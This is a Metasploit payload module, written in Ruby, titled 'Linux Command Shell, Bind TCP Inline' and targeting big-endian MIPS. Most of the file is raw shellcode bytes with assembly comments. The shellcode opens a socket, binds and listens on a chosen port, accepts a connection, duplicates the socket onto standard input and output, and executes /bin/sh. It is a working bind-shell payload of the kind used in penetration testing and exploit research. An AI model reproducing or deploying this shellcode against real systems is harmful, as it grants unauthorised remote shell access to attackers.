##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 232

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Command Shell, Bind TCP Inline',
      'Description'   => 'Listen for a connection and spawn a command shell',
      'Author'        =>
        [
          'scut',             # Original mips-irix-portshell shellcode
          'vaicebine',        # Original shellcode mod
          'Vlatko Kosturjak', # Metasploit module (mipsle)
          'juan vazquez'      # mipsbe conversion plus small fixes and optimizations
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_MIPSBE,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Payload'       =>
        {
          'Offsets' => {} ,
          'Payload' => ''
        })
    )
  end

  def generate
    if !datastore['LPORT']
      return super
    end

    port = Integer(datastore['LPORT'])
    port = [port].pack("n").unpack("cc");

    shellcode =
    # socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
    "\x27\xbd\xff\xe0" + #     addiu   sp,sp,-32
    "\x24\x0e\xff\xfd" + #     li      t6,-3
    "\x01\xc0\x20\x27" + #     nor     a0,t6,zero
    "\x01\xc0\x28\x27" + #     nor     a1,t6,zero
    "\x28\x06\xff\xff" + #     slti    a2,zero,-1
    "\x24\x02\x10\x57" + #     li      v0,4183 ( __NR_socket )
    "\x01\x01\x01\x0c" + #     syscall

    # bind(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
    "\x30\x50\xff\xff" + #     andi    s0,v0,0xffff
    "\x24\x0e\xff\xef" + #     li      t6,-17                        ; t6: 0xffffffef
    "\x01\xc0\x70\x27" + #     nor     t6,t6,zero                    ; t6: 0x10 (16)
    "\x24\x0d\xff\xfd" + #     li      t5,-3                         ; t5: -3
    "\x01\xa0\x68\x27" + #     nor     t5,t5,zero                    ; t5: 0x2
    "\x01\xcd\x68\x04" + #     sllv    t5,t5,t6                      ; t5: 0x00020000
    "\x24\x0e" + port.pack("C2") +  #     li      t6,0xFFFF (port)   ; t6: 0x115c (4444 (default LPORT))
    "\x01\xae\x68\x25" + #     or      t5,t5,t6                      ; t5: 0x0002115c
    "\xaf\xad\xff\xe0" + #     sw      t5,-32(sp)
    "\xaf\xa0\xff\xe4" + #     sw      zero,-28(sp)
    "\xaf\xa0\xff\xe8" + #     sw      zero,-24(sp)
    "\xaf\xa0\xff\xec" + #     sw      zero,-20(sp)
    "\x02\x10\x20\x25" + #     or      a0,s0,s0
    "\x24\x0e\xff\xef" + #     li      t6,-17
    "\x01\xc0\x30\x27" + #     nor     a2,t6,zero
    "\x23\xa5\xff\xe0" + #     addi    a1,sp,-32
    "\x24\x02\x10\x49" + #     li      v0,4169 ( __NR_bind )A
    "\x01\x01\x01\x0c" + #     syscall

    # listen(3, 257) = 0
    "\x02\x10\x20\x25" + #     or      a0,s0,s0
    "\x24\x05\x01\x01" + #     li      a1,257
    "\x24\x02\x10\x4e" + #     li      v0,4174 ( __NR_listen )
    "\x01\x01\x01\x0c" + #     syscall

    # accept(3, 0, NULL) = 4
    "\x02\x10\x20\x25" + #     or      a0,s0,s0
    "\x28\x05\xff\xff" + #     slti    a1,zero,-1
    "\x28\x06\xff\xff" + #     slti    a2,zero,-1
    "\x24\x02\x10\x48" + #     li      v0,4168 ( __NR_accept )
    "\x01\x01\x01\x0c" + #     syscall

    # dup2(4, 2) = 2
    # dup2(4, 1) = 1
    # dup2(4, 0) = 0
    "\xaf\xa2\xff\xff" + #     sw v0,-1(sp) # socket
    "\x24\x11\xff\xfd" + #     li s1,-3
    "\x02\x20\x88\x27" + #     nor s1,s1,zero
    "\x8f\xa4\xff\xff" + #     lw a0,-1(sp)
    "\x02\x20\x28\x21" + #     move a1,s1 # dup2_loop
    "\x24\x02\x0f\xdf" + #     li v0,4063 ( __NR_dup2 )
    "\x01\x01\x01\x0c" + #     syscall 0x40404
    "\x24\x10\xff\xff" + #     li s0,-1
    "\x22\x31\xff\xff" + #     addi s1,s1,-1
    "\x16\x30\xff\xfa" + #     bne s1,s0 <dup2_loop>

    # execve("//bin/sh", ["//bin/sh"], [/* 0 vars */]) = 0
    "\x28\x06\xff\xff" + #     slti a2,zero,-1
    "\x3c\x0f\x2f\x2f" + #     lui t7,0x2f2f "//"
    "\x35\xef\x62\x69" + #     ori t7,t7,0x6269 "bi"
    "\xaf\xaf\xff\xec" + #     sw t7,-20(sp)
    "\x3c\x0e\x6e\x2f" + #     lui t6,0x6e2f "n/"
    "\x35\xce\x73\x68" + #     ori t6,t6,0x7368 "sh"
    "\xaf\xae\xff\xf0" + #     sw t6,-16(sp)
    "\xaf\xa0\xff\xf4" + #     sw zero,-12(sp)
    "\x27\xa4\xff\xec" + #     addiu a0,sp,-20
    "\xaf\xa4\xff\xf8" + #     sw a0,-8(sp)
    "\xaf\xa0\xff\xfc" + #     sw zero,-4(sp)
    "\x27\xa5\xff\xf8" + #     addiu a1,sp,-8
    "\x24\x02\x0f\xab" + #     li v0,4011 ( __NR_execve )
    "\x01\x01\x01\x0c"   #     syscall 0x40404

    return super + shellcode
  end
end
